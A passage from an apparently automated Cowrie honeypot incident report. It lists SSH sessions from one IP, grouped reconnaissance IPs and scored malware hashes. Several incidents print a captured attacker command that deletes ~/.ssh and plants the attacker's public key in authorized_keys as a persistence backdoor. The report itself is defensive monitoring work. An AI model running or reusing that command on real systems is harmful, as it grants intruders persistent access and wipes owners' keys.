| `2026-04-16 05:21:37` | `cowrie.client.version` |
| `2026-04-16 05:21:37` | `cowrie.client.kex` |
| `2026-04-16 05:21:38` | `cowrie.login.success` |
| `2026-04-16 05:21:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392df274e547

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:23 |
| **Last Seen** | 2026-04-16 05:23 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:23:18` | `cowrie.session.connect` |
| `2026-04-16 05:23:18` | `cowrie.client.version` |
| `2026-04-16 05:23:18` | `cowrie.client.kex` |
| `2026-04-16 05:23:19` | `cowrie.login.success` |
| `2026-04-16 05:23:20` | `cowrie.session.params` |
| `2026-04-16 05:23:20` | `cowrie.command.input` |
| `2026-04-16 05:23:20` | `cowrie.command.failed` |
| `2026-04-16 05:23:20` | `cowrie.log.closed` |
| `2026-04-16 05:23:21` | `cowrie.session.params` |
| `2026-04-16 05:23:21` | `cowrie.command.input` |
| `2026-04-16 05:23:21` | `cowrie.session.file_download` |
| `2026-04-16 05:23:21` | `cowrie.log.closed` |
| `2026-04-16 05:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-925899469319

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:23 |
| **Last Seen** | 2026-04-16 05:23 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:23:25` | `cowrie.session.connect` |
| `2026-04-16 05:23:25` | `cowrie.client.version` |
| `2026-04-16 05:23:25` | `cowrie.client.kex` |
| `2026-04-16 05:23:26` | `cowrie.login.success` |
| `2026-04-16 05:23:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c60239a05e8d

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:26 |
| **Last Seen** | 2026-04-16 05:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:26:56` | `cowrie.session.connect` |
| `2026-04-16 05:26:56` | `cowrie.client.version` |
| `2026-04-16 05:26:56` | `cowrie.client.kex` |
| `2026-04-16 05:26:57` | `cowrie.login.success` |
| `2026-04-16 05:26:58` | `cowrie.session.params` |
| `2026-04-16 05:26:58` | `cowrie.command.input` |
| `2026-04-16 05:26:58` | `cowrie.command.failed` |
| `2026-04-16 05:26:58` | `cowrie.log.closed` |
| `2026-04-16 05:26:59` | `cowrie.session.params` |
| `2026-04-16 05:26:59` | `cowrie.command.input` |
| `2026-04-16 05:26:59` | `cowrie.session.file_download` |
| `2026-04-16 05:26:59` | `cowrie.log.closed` |
| `2026-04-16 05:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6bb95586ca5f

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:27 |
| **Last Seen** | 2026-04-16 05:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:27:03` | `cowrie.session.connect` |
| `2026-04-16 05:27:03` | `cowrie.client.version` |
| `2026-04-16 05:27:03` | `cowrie.client.kex` |
| `2026-04-16 05:27:04` | `cowrie.login.success` |
| `2026-04-16 05:27:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2b32157c21d3

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:35 |
| **Last Seen** | 2026-04-16 05:35 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:35:29` | `cowrie.session.connect` |
| `2026-04-16 05:35:29` | `cowrie.client.version` |
| `2026-04-16 05:35:29` | `cowrie.client.kex` |
| `2026-04-16 05:35:31` | `cowrie.login.success` |
| `2026-04-16 05:35:31` | `cowrie.session.params` |
| `2026-04-16 05:35:31` | `cowrie.command.input` |
| `2026-04-16 05:35:31` | `cowrie.command.failed` |
| `2026-04-16 05:35:31` | `cowrie.log.closed` |
| `2026-04-16 05:35:32` | `cowrie.session.params` |
| `2026-04-16 05:35:32` | `cowrie.command.input` |
| `2026-04-16 05:35:32` | `cowrie.session.file_download` |
| `2026-04-16 05:35:32` | `cowrie.log.closed` |
| `2026-04-16 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0aca85dd4786

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:35 |
| **Last Seen** | 2026-04-16 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:35:36` | `cowrie.session.connect` |
| `2026-04-16 05:35:36` | `cowrie.client.version` |
| `2026-04-16 05:35:36` | `cowrie.client.kex` |
| `2026-04-16 05:35:37` | `cowrie.login.success` |
| `2026-04-16 05:35:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ccc3be4dfb

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:39 |
| **Last Seen** | 2026-04-16 05:39 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:39:00` | `cowrie.session.connect` |
| `2026-04-16 05:39:00` | `cowrie.client.version` |
| `2026-04-16 05:39:00` | `cowrie.client.kex` |
| `2026-04-16 05:39:01` | `cowrie.login.success` |
| `2026-04-16 05:39:02` | `cowrie.session.params` |
| `2026-04-16 05:39:02` | `cowrie.command.input` |
| `2026-04-16 05:39:02` | `cowrie.command.failed` |
| `2026-04-16 05:39:02` | `cowrie.log.closed` |
| `2026-04-16 05:39:03` | `cowrie.session.params` |
| `2026-04-16 05:39:03` | `cowrie.command.input` |
| `2026-04-16 05:39:03` | `cowrie.session.file_download` |
| `2026-04-16 05:39:03` | `cowrie.log.closed` |
| `2026-04-16 05:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-996752297cb8

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:39 |
| **Last Seen** | 2026-04-16 05:39 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:39:06` | `cowrie.session.connect` |
| `2026-04-16 05:39:06` | `cowrie.client.version` |
| `2026-04-16 05:39:07` | `cowrie.client.kex` |
| `2026-04-16 05:39:08` | `cowrie.login.success` |
| `2026-04-16 05:39:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4b5c681da23f

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:44 |
| **Last Seen** | 2026-04-16 05:44 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:44:18` | `cowrie.session.connect` |
| `2026-04-16 05:44:18` | `cowrie.client.version` |
| `2026-04-16 05:44:18` | `cowrie.client.kex` |
| `2026-04-16 05:44:20` | `cowrie.login.success` |
| `2026-04-16 05:44:20` | `cowrie.session.params` |
| `2026-04-16 05:44:20` | `cowrie.command.input` |
| `2026-04-16 05:44:20` | `cowrie.command.failed` |
| `2026-04-16 05:44:20` | `cowrie.log.closed` |
| `2026-04-16 05:44:21` | `cowrie.session.params` |
| `2026-04-16 05:44:21` | `cowrie.command.input` |
| `2026-04-16 05:44:21` | `cowrie.session.file_download` |
| `2026-04-16 05:44:21` | `cowrie.log.closed` |
| `2026-04-16 05:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40310e862f2e

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:44 |
| **Last Seen** | 2026-04-16 05:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:44:25` | `cowrie.session.connect` |
| `2026-04-16 05:44:25` | `cowrie.client.version` |
| `2026-04-16 05:44:25` | `cowrie.client.kex` |
| `2026-04-16 05:44:26` | `cowrie.login.success` |
| `2026-04-16 05:44:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5a420c6bec37

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:51 |
| **Last Seen** | 2026-04-16 05:51 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:51:09` | `cowrie.session.connect` |
| `2026-04-16 05:51:09` | `cowrie.client.version` |
| `2026-04-16 05:51:09` | `cowrie.client.kex` |
| `2026-04-16 05:51:11` | `cowrie.login.success` |
| `2026-04-16 05:51:11` | `cowrie.session.params` |
| `2026-04-16 05:51:11` | `cowrie.command.input` |
| `2026-04-16 05:51:11` | `cowrie.command.failed` |
| `2026-04-16 05:51:12` | `cowrie.log.closed` |
| `2026-04-16 05:51:12` | `cowrie.session.params` |
| `2026-04-16 05:51:12` | `cowrie.command.input` |
| `2026-04-16 05:51:13` | `cowrie.session.file_download` |
| `2026-04-16 05:51:13` | `cowrie.log.closed` |
| `2026-04-16 05:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-58c7d36102f5

| Field | Detail |
|---|---|
| **Source IP** | `83.49.101[.]27` |
| **First Seen** | 2026-04-16 05:51 |
| **Last Seen** | 2026-04-16 05:51 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-16 05:51:16` | `cowrie.session.connect` |
| `2026-04-16 05:51:16` | `cowrie.client.version` |
| `2026-04-16 05:51:16` | `cowrie.client.kex` |
| `2026-04-16 05:51:18` | `cowrie.login.success` |
| `2026-04-16 05:51:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `83.49.101[.]27` to AbuseIPDB if not already reported
- [ ] Block `83.49.101[.]27` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `122.13.25[.]186` | **25** | 2026-04-16 03:45 | 2026-04-16 04:12 | 46m | 0 | `T1592` | 🟠 MEDIUM |
| `181.103.2[.]67` | **25** | 2026-04-16 03:06 | 2026-04-16 03:56 | 1m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `76.79.213[.]69` | **25** | 2026-04-16 04:39 | 2026-04-16 05:20 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `14.103.122[.]90` | **21** | 2026-04-16 04:07 | 2026-04-16 04:39 | 32m | 3 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `3.131.220[.]121` | **6** | 2026-04-16 04:56 | 2026-04-16 05:02 | 0m | 0 | `T1592` | 🟢 LOW |
| `47.251.43[.]29` | **4** | 2026-04-16 04:59 | 2026-04-16 05:00 | 0m | 2 | `T1110.001` | 🟢 LOW |
| `3.134.216[.]108` | **3** | 2026-04-16 03:12 | 2026-04-16 03:16 | 0m | 0 | `T1592` | 🟢 LOW |
| `27.37.43[.]9` | **2** | 2026-04-16 04:37 | 2026-04-16 04:41 | 2m | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `102.210.149[.]130` | 1 | 2026-04-16 04:07 | 2026-04-16 04:07 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `106.254.54[.]101` | 1 | 2026-04-16 04:05 | 2026-04-16 04:05 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `110.39.9[.]140` | 1 | 2026-04-16 04:08 | 2026-04-16 04:09 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `115.239.255[.]170` | 1 | 2026-04-16 04:11 | 2026-04-16 04:13 | 120s | 0 | `T1592` | 🟢 LOW |
| `119.255.245[.]44` | 1 | 2026-04-16 04:39 | 2026-04-16 04:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `120.48.130[.]213` | 1 | 2026-04-16 03:06 | 2026-04-16 03:08 | 120s | 0 | `T1592` | 🟢 LOW |
| `121.229.9[.]97` | 1 | 2026-04-16 03:55 | 2026-04-16 03:57 | 120s | 0 | `T1592` | 🟢 LOW |
| `122.166.167[.]154` | 1 | 2026-04-16 04:11 | 2026-04-16 04:11 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `14.103.115[.]115` | 1 | 2026-04-16 03:07 | 2026-04-16 03:09 | 120s | 0 | `T1592` | 🟢 LOW |
| `152.32.131[.]112` | 1 | 2026-04-16 03:45 | 2026-04-16 03:45 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.172[.]177` | 1 | 2026-04-16 05:06 | 2026-04-16 05:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `152.32.253[.]205` | 1 | 2026-04-16 05:06 | 2026-04-16 05:06 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `167.99.142[.]36` | 1 | 2026-04-16 04:26 | 2026-04-16 04:26 | 0s | 0 | `T1592` | 🟢 LOW |
| `171.25.158[.]47` | 1 | 2026-04-16 05:08 | 2026-04-16 05:08 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `186.117.251[.]40` | 1 | 2026-04-16 05:18 | 2026-04-16 05:18 | 14s | 0 | `T1592` | 🟢 LOW |
| `20.193.130[.]202` | 1 | 2026-04-16 03:46 | 2026-04-16 03:46 | 1s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `27.128.171[.]39` | 1 | 2026-04-16 04:39 | 2026-04-16 04:41 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-16 03:17 | 2026-04-16 03:18 | 84s | 0 | `T1592` | 🟢 LOW |
| `8.222.201[.]35` | 1 | 2026-04-16 03:53 | 2026-04-16 03:53 | 30s | 0 | `T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 41/100 | 🟡 MEDIUM | **28/76** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
